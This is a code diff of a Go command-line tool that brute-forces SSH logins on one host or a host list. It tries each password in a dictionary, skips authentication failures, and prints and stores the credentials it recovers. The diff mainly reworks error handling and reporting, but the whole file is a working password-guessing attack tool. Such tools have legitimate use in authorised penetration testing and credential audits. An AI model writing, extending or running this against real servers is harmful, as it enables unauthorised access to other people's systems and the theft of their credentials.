@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"fmt"
 	"log"
 	"math"
@@ -16,7 +17,7 @@ var authErrs = []string{
 	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain",
 }
 
-// inStrSlc returns true when s is the same as an entry of slc
+// inStrSlc returns true when str is the same as an entry of slc
 func inStrSlc(str string, slc []string) bool {
 	for _, entry := range slc {
 		if entry == str {
@@ -27,7 +28,7 @@ func inStrSlc(str string, slc []string) bool {
 }
 
 // dictAttack attempts to establish an SSH connection with the given parameters and returns a
-// non-empty password string in case of a successful connection. An empty string means an unsuccessful
+// non-empty password string and a nil error in case of a successful connection. A non-nil error means an unsuccessful
 // authentication.
 func dictAttack(h loadcfg.Host, dict *loadcfg.Dict, port string, verbose bool) (string, error) {
 	for _, pwd := range dict.Pwds() {
@@ -35,18 +36,17 @@ func dictAttack(h loadcfg.Host, dict *loadcfg.Dict, port string, verbose bool) (
 			fmt.Printf("Trying to connect with password '%s'\n", pwd)
 		}
 		if err := sshconn.SSHConn(h.IP(), h.Username(), port, pwd); err != nil {
-			// If the non-nil error is not an auth error an error is returned, otherwise we simply move on to the next pwd in dict.Pwds()
+			// If the non-nil error is not an auth error an error is returned because this means it does not have anything to do with the
+			// password being wrong. If it is an auth error, however, we simply move on to the next pwd in dict.Pwds()
 			if !inStrSlc(err.Error(), authErrs) {
 				return "", err
-			}
-			if verbose {
-				log.Println(err.Error())
 			}
 		} else {
 			return pwd, nil
 		}
 	}
-	return "", nil
+	// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
+	return "", errors.New("main: failed to authenticate with dictionary")
 }
 
 func main() {
@@ -90,17 +90,18 @@ func main() {
 
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
 			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
-			if err != nil && config.Verbose() {
-				log.Println(err.Error())
+			if err != nil {
+				if err.Error() == "main: failed to authenticate with dictionary" {
+					fmt.Println("Unable to authenticate using dictionary")
+					continue
+				} else {
+					log.Println(err.Error())
+					continue
+				}
 			}
-
-			// If pwd is "", the password was not found using the dictionary
-			if pwd == "" {
-				fmt.Printf("Unable to find password of '%s'\n", h.Username()+"@"+h.IP())
-			} else {
-				fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
-			}
+			fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
 		}
+
 	case "hostlist":
 		fmt.Printf("Loading %s...\n", config.HostlistPath())
 		hl, err := loadcfg.LoadHostlist(config.HostlistPath(), config.UsrIsHost())
@@ -114,17 +115,17 @@ func main() {
 			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hl.Hosts()))*100)))
 			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
 			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
-			if err != nil && config.Verbose() {
-				log.Println(err.Error())
+			if err != nil {
+				if err.Error() == "main: failed to authenticate with dictionary" {
+					fmt.Println("Unable to authenticate using dictionary")
+					continue
+				} else {
+					log.Println(err.Error())
+					continue
+				}
 			}
-
-			// If pwd is "", the password was not found using the dictionary
-			if pwd == "" {
-				fmt.Printf("Unable to find password of '%s'\n", h.Username()+"@"+h.IP())
-			} else {
-				hostPwdCombos[h.Username()+"@"+h.IP()] = pwd
-				fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
-			}
+			fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
+			hostPwdCombos[h.IP()] = pwd
 		}
 
 		// Print all found combinations
@@ -139,6 +140,7 @@ func main() {
 
 		fmt.Println("Press enter to exit...")
 		fmt.Scanln()
+
 	default:
 		log.Fatalf("cfg/config.yml: '%s' is not a valid mode", config.Mode())
 	}
